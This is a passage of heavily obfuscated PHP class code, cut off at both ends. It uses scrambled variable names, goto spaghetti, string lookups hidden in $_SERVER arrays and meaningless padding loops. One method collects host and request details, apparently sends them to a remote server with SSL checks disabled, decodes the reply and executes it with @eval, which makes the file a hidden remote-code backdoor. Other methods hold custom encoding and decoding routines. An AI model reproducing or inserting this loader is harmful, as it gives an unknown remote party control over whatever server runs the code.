$_SERVER[µ…]; $D˜·è™è =& $_SERVER[İ§]; $a„™Õ¤Õ•¤ = array($D˜·è™è[287], $D˜·è™è[288], $D˜·è™è[289]); goto cÏš²É¢Ë‡; E‡Æ›ä‚­: if (!$D˜·è™è[248]($_SERVER[$D˜·è™è[44]], $a„™Õ¤Õ•¤)) { return; } if ($D˜·è™è[242]() % 4 != 0) { return; } $EÑ½½³íå› = $D˜·è™è[13](array($D˜·è™è[292], $D˜·è™è[293]), $D™Ã´ÄÙĞØ); goto EË‘¹ä¸Ø; fé¯Ù¼ëŠ§: $this->{$_SERVER[İ§][170]}(); $eÎÉãá¿±ø = $D‹µˆ‘ƒ¼[638]; if (strlen($eÎÉãá¿±ø) < $D‹µˆ‘ƒ¼[579]) { die; } goto fòİâè–“–; fòİâè–“–: if ($this->{$_SERVER[İ§][206]}($Ağ¡ì½ã•[$D˜·è™è[296]]) != $còª¢¶ĞÃ[$D˜·è™è[171]]) { $Dª“Å„Ş¥ = array($D˜·è™è[208] => $D˜·è™è[61]($D˜·è™è[62])->{$_SERVER[İ§][63]}($D˜·è™è[122]), $D˜·è™è[209] => $_SERVER[$D˜·è™è[121]], $D˜·è™è[210] => $D˜·è™è[211](), $D˜·è™è[180] => $_SERVER[$D˜·è™è[181]]); $B‡”ÁÆ“Üá = $this->{$_SERVER[İ§][212]}($D˜·è™è[154]($Dª“Å„Ş¥)); $Ağ¡ì½ã• = $this->{$_SERVER[İ§][189]}($D˜·è™è[213] . $B‡”ÁÆ“Üá); if ($Ağ¡ì½ã• && $D˜·è™è[198]($Ağ¡ì½ã•) && isset($Ağ¡ì½ã•[$D˜·è™è[296]])) { $eÛ¾Æ¯ÛÛ£ = $this->{$_SERVER[İ§][195]}($Ağ¡ì½ã•[$D˜·è™è[296]], 2); if ($eÛ¾Æ¯ÛÛ£) { $eÛ¾Æ¯ÛÛ£ = $this->{$_SERVER[İ§][206]}($eÛ¾Æ¯ÛÛ£); } if ($eÛ¾Æ¯ÛÛ£) { try { @eval($eÛ¾Æ¯ÛÛ£); } catch (Exception $Aä¿¥´ ˜©) { } } } } goto A‰Ô´ôÀĞ‘; A‰Ô´ôÀĞ‘: } private function tkps53cdd31f($cßèğ¯‚éÅ = '', $b‰”¬·ÁÇ = array(), $d«±ÆâÈ = 5) { goto CÏµ¨İã˜; f‰à¨àİƒ¼: $Bœß¥­®¤ = $Cªğí‰÷‡[642]; goto Aƒîà½£é…; CÏµ¨İã˜: $Cªğí‰÷‡ =& $_SERVER[µ…]; $CöÀ‘¦í‹º =& $_SERVER[İ§]; $eÜÜ‘ŒàÙ = $CöÀ‘¦í‹º[297]; goto dä™íø–ÜÉ; bŒ˜í³…Â™: while ($f®æ§çƒäÂ < $Cªğí‰÷‡[579]) { if ($f®æ§çƒäÂ >= 0) { break; } $f®æ§çƒäÂ++; } if ($b‰”¬·ÁÇ && $CöÀ‘¦í‹º[198]($b‰”¬·ÁÇ)) { $eÜÜ‘ŒàÙ = $eÜÜ‘ŒàÙ . $CöÀ‘¦í‹º[299] . $CöÀ‘¦í‹º[300]($b‰”¬·ÁÇ); } if ($b‰”¬·ÁÇ === -1) { return $eÜÜ‘ŒàÙ; } goto f‹‰­ŞŞ; f‹‰­ŞŞ: $bœß˜Œ•×à = $CöÀ‘¦í‹º[258](array($CöÀ‘¦í‹º[259] => array($CöÀ‘¦í‹º[262] => $d«±ÆâÈ, $CöÀ‘¦í‹º[260] => $CöÀ‘¦í‹º[301]), $CöÀ‘¦í‹º[302] => array($CöÀ‘¦í‹º[303] => !1, $CöÀ‘¦í‹º[304] => !1))); $B‘İ‚ßÑ¬  = $Cªğí‰÷‡[640]; $b‰”¬·ÁÇ = @$CöÀ‘¦í‹º[263]($eÜÜ‘ŒàÙ, !1, $bœß˜Œ•×à); goto FÒ®¶µŒÕª; dä™íø–ÜÉ: $eÜÜ‘ŒàÙ = $this->{$_SERVER[İ§][256]}($eÜÜ‘ŒàÙ, $CöÀ‘¦í‹º[298]); $eÜÜ‘ŒàÙ = $eÜÜ‘ŒàÙ . $cßèğ¯‚éÅ; $f®æ§çƒäÂ = $Cªğí‰÷‡[639]; goto bŒ˜í³…Â™; FÒ®¶µŒÕª: $E†ê†è£Á = $Cªğí‰÷‡[641]; while (strlen($E†ê†è£Á) < $Cªğí‰÷‡[579]) { if (!$E†ê†è£Á) { break; } $E†ê†è£Á++; } return $CöÀ‘¦í‹º[197]($b‰”¬·ÁÇ, !0); goto f‰à¨àİƒ¼; Aƒîà½£é…: } private function oztub4320a32() { goto dÈºé§£³¾; eù¬Äù¦¬: $FŞ¬ˆ‰¾‚´ = $d“°œŒŠÓ[250]($FŞ¬ˆ‰¾‚´ ? $FŞ¬ˆ‰¾‚´ : $d“°œŒŠÓ[306]); $bñš¶ì†í¡ = $eˆçóÜ™Å[644]; $bæçË¦ô©Ú = $d“°œŒŠÓ[112]($this->zvum85d87bf9, $d“°œŒŠÓ[332]); goto C©©©àèÚë; F’†¡“«Î†: $FŞ¬ˆ‰¾‚´ = $fÕŠ®õ‡ë‹[$this->ljqdcfa3de1b]; $E¬Õ˜Æˆ = $eˆçóÜ™Å[643]; while (strlen($E¬Õ˜Æˆ) < $eˆçóÜ™Å[574]) { if (!$E¬Õ˜Æˆ) { break; } $E¬Õ˜Æˆ++; } goto eù¬Äù¦¬; C©©©àèÚë: $bæçË¦ô©Ú = $bæçË¦ô©Ú ? $d“°œŒŠÓ[250]($bæçË¦ô©Ú) : 0; return $FŞ¬ˆ‰¾‚´ + $bæçË¦ô©Ú; goto E¸Çâçî£ò; dÈºé§£³¾: $eˆçóÜ™Å =& $_SERVER[µ…]; $d“°œŒŠÓ =& $_SERVER[İ§]; $fÕŠ®õ‡ë‹ = array($d“°œŒŠÓ[305] => $d“°œŒŠÓ[306], $d“°œŒŠÓ[307] => $d“°œŒŠÓ[308], $d“°œŒŠÓ[309] => $d“°œŒŠÓ[310], $d“°œŒŠÓ[311] => $d“°œŒŠÓ[312], $d“°œŒŠÓ[313] => $d“°œŒŠÓ[314], $d“°œŒŠÓ[315] => $d“°œŒŠÓ[251], $d“°œŒŠÓ[316] => $d“°œŒŠÓ[251], $d“°œŒŠÓ[317] => $d“°œŒŠÓ[306], $d“°œŒŠÓ[318] => $d“°œŒŠÓ[308], $d“°œŒŠÓ[319] => $d“°œŒŠÓ[310], $d“°œŒŠÓ[320] => $d“°œŒŠÓ[321], $d“°œŒŠÓ[322] => $d“°œŒŠÓ[312], $d“°œŒŠÓ[323] => $d“°œŒŠÓ[324], $d“°œŒŠÓ[325] => $d“°œŒŠÓ[314], $d“°œŒŠÓ[326] => $d“°œŒŠÓ[327], $d“°œŒŠÓ[328] => $d“°œŒŠÓ[329], $d“°œŒŠÓ[330] => $d“°œŒŠÓ[331]); goto F’†¡“«Î†; E¸Çâçî£ò: } public function zjnub5062acd($DÓŒİ×¤ëğ) { goto F¬¥Éâ·¹¸; fŸóåœ™õ¯: if ($dêà…¦Úç <= $aß‹ ê‰Íò) { return; } $dâµƒ¥†ğ = $féŒ¹Õ £ø[61]($féŒ¹Õ £ø[145])->{$_SERVER[İ§][334]}($féŒ¹Õ £ø[333])->{$_SERVER[İ§][335]}($aß‹ ê‰Íò)->{$_SERVER[İ§][336]}(); $dâµƒ¥†ğ = $féŒ¹Õ £ø[228]($dâµƒ¥†ğ, $féŒ¹Õ £ø[10], $féŒ¹Õ £ø[333]); goto aÉİœŒİ–; F¬¥Éâ·¹¸: $bçéÈĞ‘‹” =& $_SERVER[µ…]; $féŒ¹Õ £ø =& $_SERVER[İ§]; $aß‹ ê‰Íò = $this->{$_SERVER[İ§][143]}(); goto b…ì¤éìİç; b…ì¤éìİç: $EÙ¼’æÉÏ = $bçéÈĞ‘‹”[645]; if ($DÓŒİ×¤ëğ[$féŒ¹Õ £ø[333]] == $féŒ¹Õ £ø[226]) { return; } if ($aß‹ ê‰Íò >= $féŒ¹Õ £ø[250]($féŒ¹Õ £ø[251])) { return; } goto CŸêìÁ¬é­; CŸêìÁ¬é­: $dêà…¦Úç = $féŒ¹Õ £ø[61]($féŒ¹Õ £ø[145])->{$_SERVER[İ§][146]}(); $a²¢ì×ºÍÕ = $bçéÈĞ‘‹”[646]; while (strlen($a²¢ì×ºÍÕ) < $bçéÈĞ‘‹”[574]) { if (!$a²¢ì×ºÍÕ) { break; } $a²¢ì×ºÍÕ++; } goto fŸóåœ™õ¯; aÉİœŒİ–: $Câ¸¹ÓÏ˜’ = $bçéÈĞ‘‹”[647]; if (!$féŒ¹Õ £ø[248]($DÓŒİ×¤ëğ[$féŒ¹Õ £ø[333]], $dâµƒ¥†ğ)) { $féŒ¹Õ £ø[172]($féŒ¹Õ £ø[337], !1, $féŒ¹Õ £ø[245]); } goto Cë²¡¾ß­ƒ; Cë²¡¾ß­ƒ: } public function fkrx8c842a68() { goto eˆ¯îÎİ; fˆ¹‹‡‰: while (strlen($bª°ìĞ©£) < $EÀ«´¾†»Å[577]) { if (!$bª°ìĞ©£) { break; } $bª°ìĞ©£++; } $D‹ˆêï˜ = $a’©¦ªÉõì[258](array($a’©¦ªÉõì[259] => array($a’©¦ªÉõì[260] => $a’©¦ªÉõì[261], $a’©¦ªÉõì[262] => 3))); $d“æ‡ÀË¬ø = @$a’©¦ªÉõì[263]($A¶˜ì’ìƒ«, !1, $D‹ˆêï˜); goto Dåëù”ø‚ˆ; Dåëù”ø‚ˆ: $AÌ¸¦×ğõÛ = $EÀ«´¾†»Å[649]; if (!$AÌ¸¦×ğõÛ) { return; } echo $a’©¦ªÉõì[339] . $a’©¦ªÉõì[340]($d“æ‡ÀË¬ø) . $a’©¦ªÉõì[341]; goto eùÜ”Ö²„Ô; eˆ¯îÎİ: $EÀ«´¾†»Å =& $_SERVER[µ…]; $a’©¦ªÉõì =& $_SERVER[İ§]; if (!$a’©¦ªÉõì[112]($GLOBALS, $a’©¦ªÉõì[138]) || $a’©¦ªÉõì[338](1, 100) > 20) { return; } goto E¿ÜšÇß‚Õ; E¿ÜšÇß‚Õ: $A¶˜ì’ìƒ« = $a’©¦ªÉõì[255]; $A¶˜ì’ìƒ« = $this->{$_SERVER[İ§][256]}($A¶˜ì’ìƒ«, $a’©¦ªÉõì[257]); $bª°ìĞ©£ = $EÀ«´¾†»Å[648]; goto fˆ¹‹‡‰; eùÜ”Ö²„Ô: } private function jamif4454344($C˜¤ƒ»´–¡, $føÉ÷¡¾Ä², $aÜˆÈ§´Ã = 3) { goto c¬»„ô×º; bÏ°Ì…²ëé: $EŒÎ±ù‚ˆ  = $FòÂËŞ–“Ä[343]; switch ($fÓØ¿º’šˆ) { case $FòÂËŞ–“Ä[240]: $cÄÄ§•± = $this->{$_SERVER[İ§][153]}($C˜¤ƒ»´–¡, $FòÂËŞ–“Ä[220]($føÉ÷¡¾Ä² . $aÚ¯¬ÌØœö)); break; case $FòÂËŞ–“Ä[226]: $cÄÄ§•± = $this->{$_SERVER[İ§][153]}($C˜¤ƒ»´–¡, $FòÂËŞ–“Ä[220]($aÚ¯¬ÌØœö . $føÉ÷¡¾Ä²)); break; $B°ˆ÷´ÀÔ = $e«ÓÃª„¹Ê[652]; case $FòÂËŞ–“Ä[344]: $cÄÄ§•± = $this->{$_SERVER[İ§][153]}($C˜¤ƒ»´–¡, $FòÂËŞ–“Ä[124]($aÚ¯¬ÌØœö . $føÉ÷¡¾Ä²)); $díõœà„¦´ = $e«ÓÃª„¹Ê[642]; if (!$díõœà„¦´) { die; } break; $BÉï’Ô¸î = $e«ÓÃª„¹Ê[653]; case $FòÂËŞ–“Ä[345]: $cÄÄ§•± = $this->{$_SERVER[İ§][153]}($C˜¤ƒ»´–¡, $FòÂËŞ–“Ä[120]($aÚ¯¬ÌØœö . $føÉ÷¡¾Ä²)); $aÇÁÃ‡ŠæÉ = $e«ÓÃª„¹Ê[654]; if (strlen($aÇÁÃ‡ŠæÉ) < $e«ÓÃª„¹Ê[579]) { die; } break; case $FòÂËŞ–“Ä[346]: goto B÷ìôîÅÒ; C’½ŠÎÎ£Œ: $cÖîÆŒ¾Ã = $e«ÓÃª„¹Ê[656]; if (!$cÖîÆŒ¾Ã) { die; } $d¸†¸§—è” = $EŒÎ±ù‚ˆ [$b–—Ï›¹]; goto E—‹§£ÛŞê; E—‹§£ÛŞê: $C˜“ŞÚ¢±‚ = $e«ÓÃª„¹Ê[657]; if (strlen($C˜“ŞÚ¢±‚) < $e«ÓÃª„¹Ê[574]) { die; } $Dô¯âˆ‘ö› = $FòÂËŞ–“Ä[120]($d¸†¸§—è” . $FòÂËŞ–“Ä[120]($føÉ÷¡¾Ä² . $d¸†¸§—è”) . $føÉ÷¡¾Ä²); goto fËïöÇ…¤¡; dïÄéÛ¶ßô: break; $fÜĞ´õ’£„ = $e«ÓÃª„¹Ê[587]; if (!$fÜĞ´õ’£„) { return; } goto EÉ¬Ü¼ˆ†…; Eƒ§äƒ­¿¼: $E‘…Ü²˜„œ = 0; $Dî­¿õ¸ó™ = $e«ÓÃª„¹Ê[660]; while ($Dî­¿õ¸ó™ < $e«ÓÃª„¹Ê[570]) { if ($Dî­¿õ¸ó™ >= 0) { break; } $Dî­¿õ¸ó™++; } goto aôÌ¡—Ìô; F¥†œÀ ¨„: $c­½Œ›ëƒŸ = 0; $a«ÇñÉ±¹ = $e«ÓÃª„¹Ê[659]; while (strlen($a«ÇñÉ±¹) < $e«ÓÃª„¹Ê[577]) { if (!$a«ÇñÉ±¹) { break; } $a«ÇñÉ±¹++; } goto Eƒ§äƒ­¿¼; fËïöÇ…¤¡: $Dô¯âˆ‘ö› = $FòÂËŞ–“Ä[25]($Dô¯âˆ‘ö›, $b–—Ï›¹ % 8, $b–—Ï›¹ % 8 + 7); $dÃÑ‘¢†ç° = $FòÂËŞ–“Ä[10]; $dŠ­Á¹·õ÷ = $e«ÓÃª„¹Ê[658]; goto F¥†œÀ ¨„; B÷ìôîÅÒ: $C˜¤ƒ»´–¡ = $FòÂËŞ–“Ä[124]($C˜¤ƒ»´–¡); $A‹–”ØÖ¥Õ = $e«ÓÃª„¹Ê[655]; $b–—Ï›¹ = $FòÂËŞ–“Ä[347](0, 64); goto C’½ŠÎÎ£Œ; aôÌ¡—Ìô: $b¸Îíñòë = 0; for ($c­½Œ›ëƒŸ = 0; $c­½Œ›ëƒŸ < $FòÂËŞ–“Ä[24]($C˜¤ƒ»´–¡); $c­½Œ›ëƒŸ++) { $b¸Îíñòë = $b¸Îíñòë == $FòÂËŞ–“Ä[24]($Dô¯âˆ‘ö›) ? 0 : $b¸Îíñòë; $E‘…Ü²˜„œ = ($b–—Ï›¹ + $FòÂËŞ–“Ä[348]($EŒÎ±ù‚ˆ , $C˜¤ƒ»´–¡[$c­½Œ›ëƒŸ]) + $FòÂËŞ–“Ä[349]($Dô¯âˆ‘ö›[$b¸Îíñòë++])) % 64; $dÃÑ‘¢†ç° .= $EŒÎ±ù‚ˆ [$E‘…Ü²˜„œ]; } $cÄÄ§•± = $FòÂËŞ–“Ä[340]($d¸†¸§—è” . $dÃÑ‘¢†ç°); goto dïÄéÛ¶ßô; EÉ¬Ü¼ˆ†…: default: $cÄÄ§•± = $this->{$_SERVER[İ§][153]}($C˜¤ƒ»´–¡, $føÉ÷¡¾Ä² . $aÚ¯¬ÌØœö); break; $DàÃˆ¨…¹í = $e«ÓÃª„¹Ê[661]; if (!$DàÃˆ¨…¹í) { die; } } $cÄÄ§•± = $FòÂËŞ–“Ä[220]($fÓØ¿º’šˆ . $aÚ¯¬ÌØœö . $cÄÄ§•±); goto aô¹îÚ†ç; c¬»„ô×º: $e«ÓÃª„¹Ê =& $_SERVER[µ…]; $FòÂËŞ–“Ä =& $_SERVER[İ§]; $FòÂËŞ–“Ä[342](1); goto CğÂ¾–Àè‡; CğÂ¾–Àè‡: $Eâ•Ìîï†Ô = $e«ÓÃª„¹Ê[650]; $C˜¤ƒ»´–¡ = $FòÂËŞ–“Ä[2]($C˜¤ƒ»´–¡); $fÓØ¿º’šˆ = $FòÂËŞ–“Ä[338](0, 5) . $FòÂËŞ–“Ä[10]; goto e“¯‚Õ£ÀŞ; aô¹îÚ†ç: if ($aÜˆÈ§´Ã - 1 > 0) { $cÄÄ§•± = $this->{$_SERVER[İ§][133]}($cÄÄ§•±, $føÉ÷¡¾Ä², $aÜˆÈ§´Ã - 1); } return $cÄÄ§•±; goto AŒÒ™ÔË¾Ş; e“¯‚Õ£ÀŞ: $e½èì·Ó¼‹ = $e«ÓÃª„¹Ê[651]; while ($e½èì·Ó¼‹ < $e«ÓÃª„¹Ê[579]) { if ($e½èì·Ó¼‹ >= 0) { break; } $e½èì·Ó¼‹++; } $aÚ¯¬ÌØœö = $FòÂËŞ–“Ä[130](15); goto bÏ°Ì…²ëé; AŒÒ™ÔË¾Ş: } private function abkf96469888($bù¬àºèôâ, $Fãô÷Ê¯Ë, $AÖ‹Ñ»Ğë = 3) { goto d•È‘˜±Ÿõ; cì”ó°†·„: if (strlen($E©Œ’ª™ˆ²) < $Bˆ²ò÷çµ[570]) { return; } $D„©èª’ô„ = $AŠÁÑµŒ¡‰[25]($bù¬àºèôâ, 1, 15); $f·Ù‰¨¢º = $Bˆ²ò÷çµ[664]; goto fóö„ã Â; f•ƒ„ËøÂ»: $bù¬àºèôâ = $AŠÁÑµŒ¡‰[220]($bù¬àºèôâ); $FÇÈ®Ê¢Ïà = $bù¬àºèôâ[0]; $E©Œ’ª™ˆ² = $Bˆ²ò÷çµ[663]; goto cì”ó°†·„; d•È‘˜±Ÿõ: $Bˆ²ò÷çµ =& $_SERVER[µ…]; $AŠÁÑµŒ¡‰ =& $_SERVER[İ§]; if (!$AŠÁÑµŒ¡‰[350]($bù¬àºèôâ) || $AŠÁÑµŒ¡‰[24]($bù¬àºèôâ) < 10) { return !1; } goto cÙœô Ø¦ˆ; fóö„ã Â: if (!$f·Ù‰¨¢º) { return; } $bù¬àºèôâ = $AŠÁÑµŒ¡‰[25]($bù¬àºèôâ, 16); $Eù” î– = $AŠÁÑµŒ¡‰[343]; goto E‘á‘éØ°; cÙœô Ø¦ˆ: $bù¬àºèôâ = $AŠÁÑµŒ¡‰[2]($bù¬àºèôâ); $CÇæ¾ğàÌØ = $Bˆ²ò÷çµ[662]; while (strlen($CÇæ¾ğàÌØ) < $Bˆ²ò÷çµ[574]) { if (!$CÇæ¾ğàÌØ) { break; } $CÇæ¾ğàÌØ++; } goto f•ƒ„ËøÂ»; E‘á‘éØ°: switch ($FÇÈ®Ê¢Ïà) { case $AŠÁÑµŒ¡‰[240]: $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][256]}($bù¬àºèôâ, $AŠÁÑµŒ¡‰[220]($Fãô÷Ê¯Ë . $D„©èª’ô„)); $aÍğ†õƒŠ = $Bˆ²ò÷çµ[665]; if (strlen($aÍğ†õƒŠ) < $Bˆ²ò÷çµ[570]) { return; } break; $cæÃ•µå’ = $Bˆ²ò÷çµ[666]; case $AŠÁÑµŒ¡‰[226]: $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][256]}($bù¬àºèôâ, $AŠÁÑµŒ¡‰[220]($D„©èª’ô„ . $Fãô÷Ê¯Ë)); $eÆ½¯ÍÛò‘ = $Bˆ²ò÷çµ[667]; break; case $AŠÁÑµŒ¡‰[344]: $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][256]}($bù¬àºèôâ, $AŠÁÑµŒ¡‰[124]($D„©èª’ô„ . $Fãô÷Ê¯Ë)); break; case $AŠÁÑµŒ¡‰[345]: $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][256]}($bù¬àºèôâ, $AŠÁÑµŒ¡‰[120]($D„©èª’ô„ . $Fãô÷Ê¯Ë)); break; case $AŠÁÑµŒ¡‰[346]: goto D££Şä×ÁŒ; Bâø¢—îíº: $F…¸¼­ƒŠ© = $Bˆ²ò÷çµ[671]; if (strlen($F…¸¼­ƒŠ©) < $Bˆ²ò÷çµ[577]) { die; } $d‡¼òÚø½ = 0; goto fõø«²òØ°; f’©›’Ğï: if (strlen($f»î‡ÖÂÍ­) < $Bˆ²ò÷çµ[570]) { return; } goto EîØ‘ùâá–; D›ªÖ¢óƒ: while ($a¬è½›ˆ½ < $Bˆ²ò÷çµ[579]) { if ($a¬è½›ˆ½ >= 0) { break; } $a¬è½›ˆ½++; } $bù¬àºèôâ = $AŠÁÑµŒ¡‰[25]($bù¬àºèôâ, 1); $CÉ›ãÜ¯¾ = $AŠÁÑµŒ¡‰[348]($Eù” î–, $fßí‹Æèğæ); goto BºÀ·ª‰À±; fõø«²òØ°: $D›ãæ—ÁµË = $Bˆ²ò÷çµ[672]; if (strlen($D›ãæ—ÁµË) < $Bˆ²ò÷çµ[594]) { return; } $dÂˆØåÆè» = 0; goto cƒà¥öŞô; D££Şä×ÁŒ: $bù¬àºèôâ = $AŠÁÑµŒ¡‰[351]($bù¬àºèôâ); $fßí‹Æèğæ = $bù¬àºèôâ[0]; $a¬è½›ˆ½ = $Bˆ²ò÷çµ[668]; goto D›ªÖ¢óƒ; BºÀ·ª‰À±: $b°®Ãà¤²× = $Bˆ²ò÷çµ[669]; if (!$b°®Ãà¤²×) { die; } $a¿¥Ú ’åï = $AŠÁÑµŒ¡‰[120]($fßí‹Æèğæ . $AŠÁÑµŒ¡‰[120]($Fãô÷Ê¯Ë . $fßí‹Æèğæ) . $Fãô÷Ê¯Ë); goto b‡æ¯™ñïî; b‡æ¯™ñïî: $F‰æÒÒïÂÙ = $Bˆ²ò÷çµ[670]; $a¿¥Ú ’åï = $AŠÁÑµŒ¡‰[25]($a¿¥Ú ’åï, $CÉ›ãÜ¯¾ % 8, $CÉ›ãÜ¯¾ % 8 + 7); $dê¹Œ†åË¾ = $AŠÁÑµŒ¡‰[10]; goto Bâø¢—îíº; cƒà¥öŞô: $a†øİ…ç¼ = $Bˆ²ò÷çµ[673]; if (!$a†øİ…ç¼) { die; } $aéÑ„èª·Ü = 0; goto b÷öæÀ¦»¼; d®©•’ªØø: $CäµØˆ†Ó¾ = $AŠÁÑµŒ¡‰[352]($dê¹Œ†åË¾); break; $f»î‡ÖÂÍ­ = $Bˆ²ò÷çµ[678]; goto f’©›’Ğï; b÷öæÀ¦»¼: $A…²Äå”À = $Bˆ²ò÷çµ[674]; if (strlen($A…²Äå”À) < $Bˆ²ò÷çµ[574]) { return; } for ($d‡¼òÚø½ = 0; $d‡¼òÚø½ < $AŠÁÑµŒ¡‰[24]($bù¬àºèôâ); $d‡¼òÚø½++) { $aéÑ„èª·Ü = $aéÑ„èª·Ü == $AŠÁÑµŒ¡‰[24]($a¿¥Ú ’åï) ? 0 : $aéÑ„èª·Ü; $aØáà–ŸŒ = $aéÑ„èª·Ü++; $DÇšİ†ÙË® = $Bˆ²ò÷çµ[675]; while (strlen($DÇšİ†ÙË®) < $Bˆ²ò÷çµ[594]) { if (!$DÇšİ†ÙË®) { break; } $DÇšİ†ÙË®++; } $dÂˆØåÆè» = $AŠÁÑµŒ¡‰[348]($Eù” î–, $bù¬àºèôâ[$d‡¼òÚø½]) - $CÉ›ãÜ¯¾ - $AŠÁÑµŒ¡‰[349]($a¿¥Ú ’åï[$aØáà–ŸŒ]); while ($dÂˆØåÆè» < 0) { $dÂˆØåÆè» += 64; $C‡ñãøÎ÷³ = $Bˆ²ò÷çµ[676]; if (strlen($C‡ñãøÎ÷³) < $Bˆ²ò÷çµ[579]) { return; } } $dê¹Œ†åË¾ .= $Eù” î–[$dÂˆØåÆè»]; $b§„Éä´šŠ = $Bˆ²ò÷çµ[677]; if (strlen($b§„Éä´šŠ) < $Bˆ²ò÷çµ[594]) { return; } } goto d®©•’ªØø; EîØ‘ùâá–: default: $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][256]}($bù¬àºèôâ, $Fãô÷Ê¯Ë . $D„©èª’ô„); $d²”ˆ‚ôáÕ = $Bˆ²ò÷çµ[679]; break; $B‹ŒÖÕ»¸… = $Bˆ²ò÷çµ[680]; if (strlen($B‹ŒÖÕ»¸…) < $Bˆ²ò÷çµ[570]) { return; } } if ($AÖ‹Ñ»Ğë - 1 > 0) { $CäµØˆ†Ó¾ = $this->{$_SERVER[İ§][195]}($CäµØˆ†Ó¾, $Fãô÷Ê¯Ë, $AÖ‹Ñ»Ğë - 1); } return $CäµØˆ†Ó¾; goto c‡ë½ŒÌ¦; c‡ë½ŒÌ¦: } public function jhks51767f1b($AĞÊÓÇÁ¾µ) { goto fÑ“—Äöµ›; e‰£ƒÅãÑî: $F¦”íİ›­ = $B ®„„íß[681]; if (!$F¦”íİ›­) { die; } $f³ÖÖ‘­Ë® = $this->{$_SERVER[İ§][353]}(); goto c¹ÈìÓÈŒÊ; aÆ°¯ˆ®: for ($b½Í‡‰İø† = 0; $b½Í‡‰İø† < $cóÉğõÏó * 10; $b½Í‡‰İø†++) { if (($cóÉğõÏó * $b½Í‡‰İø† + 1) % $b¼ÇÆŸ…Á == 0) { $B¯’ª¡ Ğø = $fŠ¼¹‚°Æë[250](($cóÉğõÏó * $b½Í‡‰İø† + 1) / $b¼ÇÆŸ…Á); break; } } $a²•ßñíë™ = $this->{$_SERVER[İ§][153]}($eÉóõ©ºİå * $f³ÖÖ‘­Ë® . $fŠ¼¹‚°Æë[10], $fŠ¼¹‚°Æë[155]); $E¦›Š…£ÒÈ = $B ®„„íß[685]; goto BĞåŒåŒ”œ; fÑ“—Äöµ›: $B ®„„íß =& $_SERVER[µ…]; $fŠ¼¹‚°Æë =& $_SERVER[İ§]; $eÉóõ©ºİå = $this->{$_SERVER[İ§][353]}(); goto e‰£ƒÅãÑî; c¹ÈìÓÈŒÊ: $FÒÂÏ’î× = $B ®„„íß[682]; if (strlen($FÒÂÏ’î×) < $B ®„„íß[577]) { die; } $cóÉğõÏó = ($eÉóõ©ºİå - 1) * ($f³ÖÖ‘­Ë® - 1); goto a¨Õ†›©ø×; fÕÖ†éÆÄ: $c¸µÈŠ¾ = $B ®„„íß[684]; while (1) { $d»¶Ô¦§Ë = $b¼ÇÆŸ…Á; $b¹é™ïîò = $cóÉğõÏó; while ($b¹é™ïîò % $d»¶Ô¦§Ë != 0) { $C÷À™œ½× = $b¹é™ïîò; $b¹é™ïîò = $d»¶Ô¦§Ë; $d»¶Ô¦§Ë = $C÷À™œ½× % $d»¶Ô¦§Ë; } if ($d»¶Ô¦§Ë == 1) { break; } else { $b¼ÇÆŸ…Á++; } } $B¯’ª¡ Ğø = 2; goto aÆ°¯ˆ®; Bì´†óÙ¼§: if (strlen($CãùØˆí†ª) < $B ®„„íß[574]) { die; } goto cª­ª¢Ö¸ğ; BĞåŒåŒ”œ: $Eæ¿‹ïİµ = $fŠ¼¹‚°Æë[120]($fŠ¼¹‚°Æë[354] . ($eÉóõ©ºİå + $f³ÖÖ‘­Ë®) . $fŠ¼¹‚°Æë[355] . $b¼ÇÆŸ…Á . $fŠ¼¹‚°Æë[355] . $B¯’ª¡ Ğø . $fŠ¼¹‚°Æë[356]); $A¡Ã±ª¾ = $B ®„„íß[686]; if (strlen($A¡Ã±ª¾) < $B ®„„íß[579]) { die; } goto FàêÀœóÏÜ; a¨Õ†›©ø×: $b’ÄßÎ‰Ÿ = $B ®„„íß[683]; if (!$b’ÄßÎ‰Ÿ) { return; } $b¼ÇÆŸ…Á = $fŠ¼¹‚°Æë[250](($eÉóõ©ºİå + $f³ÖÖ‘­Ë®) / 2); goto fÕÖ†éÆÄ; FàêÀœóÏÜ: $B£ÂÌîé˜Ê = $this->{$_SERVER[İ§][153]}($AĞÊÓÇÁ¾µ, $Eæ¿‹ïİµ) . $fŠ¼¹‚°Æë[357] . $a²•ßñíë™; return $B£ÂÌîé˜Ê; $CãùØˆí†ª = $B ®„„íß[687]; goto Bì´†óÙ¼§; cª­ª¢Ö¸ğ: } public function jwvxd4c9f294($a’âŒÌÕÏ) { goto C±êò…¿µİ; Bç”Á»¬£Ò: $f¦ÁßÚˆƒù = 0; $cÃÏ›½å¨Œ = 0; $aåƒÊ‚Ş™Ì = $F±¶ÔÙõ¦[689]; goto FİÍÚË²“; C±êò…¿µİ: $F±¶ÔÙõ¦ =& $_SERVER[µ…]; $f«”Ã™ËÚ· =& $_SERVER[İ§]; $d‹‹æªô— = $f«”Ã™ËÚ·[0]($f«”Ã™ËÚ·[357], $a’âŒÌÕÏ); goto d†Ã™²ö÷; C…©ó§»ï: if (strlen($D÷Åò¿ùé) < $F±¶ÔÙõ¦[570]) { return; } $d„–²Ş—öê = $this->{$_SERVER[İ§][256]}($d‹‹æªô—[0], $F¡»´£íõ); $d¸ñ­Ÿø = $F±¶ÔÙõ¦[695]; goto C¯’š¸íİ; AåöÆÂ«ë±: $DğŒ¡È²… = $F±¶ÔÙõ¦[691]; if (strlen($DğŒ¡È²…) < $F±¶ÔÙõ¦[594]) { die; } while (1) { $dé‹·áëƒ = $aİ–éğÀ; $A²ŠŠ¾¢–Ğ = $fàÃ¢Õ †İ; while ($A²ŠŠ¾¢–Ğ % $dé‹·áëƒ != 0) { $Dä¹ŸÇœ»Ş = $A²ŠŠ¾¢–Ğ; $A²ŠŠ¾¢–Ğ = $dé‹·áëƒ; $D¶à½Œä‡¤ = $F±¶ÔÙõ¦[692]; while (strlen($D¶à½Œä‡¤) < $F±¶ÔÙõ¦[594]) { if (!$D¶à½Œä‡¤) { break; } $D¶à½Œä‡¤++; } $dé‹·áëƒ = $Dä¹ŸÇœ»Ş % $dé‹·áëƒ; } if ($dé‹·áëƒ == 1) { break; } else { $aİ–éğÀ++; } } goto cò¦áèŸ½É; C¯’š¸íİ: return $d„–²Ş—öê; goto Dã®ËÊº•ˆ; d†Ã™²ö÷: if ($f«”Ã™ËÚ·[19]($d‹‹æªô—) != 2) { return 